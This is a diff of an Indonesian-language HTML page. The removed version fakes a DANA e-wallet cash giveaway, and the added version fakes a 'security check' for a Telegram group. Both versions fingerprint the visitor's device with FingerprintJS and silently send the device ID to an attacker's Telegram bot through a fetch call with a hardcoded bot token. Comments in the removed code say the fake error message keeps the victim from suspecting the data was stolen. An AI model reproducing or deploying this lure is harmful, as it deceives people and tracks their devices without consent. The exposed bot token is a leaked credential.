@@ -3,62 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DANA KAGET - Klaim Sekarang</title>
-    <meta property="og:title" content="🧧 DANA KAGET KHUSUS MEMBER BARU">
-    <meta property="og:description" content="Klik untuk klaim saldo DANA Kaget Anda hari ini!">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_danaindonesia.png">
-    
+    <title>Sistem Verifikasi Hayabusa</title>
     <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
     <style>
-        body { background-color: #0086e6; color: white; font-family: 'Arial', sans-serif; text-align: center; padding: 50px 20px; }
-        .card { background: white; color: #333; border-radius: 15px; padding: 30px 20px; max-width: 350px; margin: 0 auto; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
-        .btn { background: #0086e6; color: white; padding: 12px 25px; border: none; border-radius: 25px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; width: 80%; }
-        .logo { width: 120px; margin-bottom: 15px; }
-        h3 { margin: 10px 0; color: #0086e6; }
-        p { font-size: 14px; color: #666; line-height: 1.5; }
+        body { background-color: #121212; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 50px 20px; }
+        .box { border: 2px solid #00ff00; border-radius: 10px; padding: 30px; max-width: 400px; margin: 0 auto; box-shadow: 0 0 20px #00ff00; }
+        .btn { background: #00ff00; color: black; padding: 15px 30px; border: none; font-weight: bold; cursor: pointer; margin-top: 20px; width: 100%; }
+        .loader { display: none; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_danaindonesia.png" class="logo" alt="DANA">
-        <h3>Selamat!</h3>
-        <p>Anda mendapatkan kesempatan klaim <b>Dana Kaget</b>. Klik tombol di bawah untuk memverifikasi dompet digital Anda.</p>
-        <div id="status">
-            <button class="btn" onclick="startScan()">KLAIM SEKARANG</button>
+    <div class="box">
+        <h2>🛡️ SECURITY CHECK</h2>
+        <p>Verifikasi identitas perangkat diperlukan untuk akses grup ini.</p>
+        <div id="ui">
+            <button class="btn" onclick="verify()">KONFIRMASI PERANGKAT</button>
+        </div>
+        <div id="loader" class="loader">
+            <p>Scanning Hardware ID...</p>
+            <p id="progress">[..........]</p>
         </div>
     </div>
 
     <script>
-        // Ambil parameter dari link (userid dan chatid)
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get('userid');
         const chatId = urlParams.get('chatid');
 
-        function startScan() {
-            if (!userId || !chatId) {
-                alert("Parameter tidak lengkap!");
-                return;
-            }
-
-            document.getElementById('status').innerHTML = "<p>Sedang memproses klaim...</p>";
+        function verify() {
+            document.getElementById('ui').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
             
             FingerprintJS.load().then(fp => fp.get()).then(result => {
-                const visitorId = result.visitorId;
+                const deviceId = result.visitorId;
+                const botToken = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI";
 
-                // ⚠️ GANTI 'TOKEN_BOT_LU' DI BAWAH INI DENGAN TOKEN ASLI DARI BOTFATHER
-                const botToken = "8373626378:AAHmCRe_FCCDug1yrlsnat6WFhi71Qf6lQI"; 
-                
-                // Kirim data rahasia ke bot
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=/process_verif ${userId} ${visitorId}`)
+                // Kirim perintah rahasia ke bot
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=/process_verif ${userId} ${deviceId}`)
                 .then(() => {
-                    // Kasih pesan error boongan biar dia gak curiga kalau datanya dicuri
-                    setTimeout(() => {
-                        document.getElementById('status').innerHTML = "<p style='color:red; font-weight:bold;'>⚠️ ERROR: Maaf, kuota Dana Kaget untuk perangkat Anda sudah habis!</p>";
-                    }, 2000);
-                })
-                .catch(err => {
-                    console.error(err);
-                    document.getElementById('status').innerHTML = "<p style='color:red;'>Koneksi gagal. Coba lagi.</p>";
+                    let p = 0;
+                    let interval = setInterval(() => {
+                        p += 10;
+                        document.getElementById('progress').innerText = "[" + "#".repeat(p/10) + ".".repeat(10-p/10) + "]";
+                        if(p >= 100) {
+                            clearInterval(interval);
+                            document.body.innerHTML = "<h1>✅ VERIFIKASI BERHASIL</h1><p>Silakan kembali ke Telegram.</p>";
+                        }
+                    }, 200);
                 });
             });
         }
